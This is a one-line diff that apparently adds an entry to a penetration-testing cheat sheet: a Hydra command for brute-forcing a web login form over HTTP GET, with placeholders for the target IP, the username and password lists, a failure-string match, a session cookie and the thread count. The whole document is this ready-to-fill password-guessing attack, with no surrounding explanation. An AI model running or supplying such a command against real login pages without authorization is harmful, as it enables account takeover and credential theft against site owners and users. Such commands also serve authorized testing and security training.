@@ -1,0 +1,1 @@
+hydra <IP> -V -L <USER List> -P <PASSWORDS LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
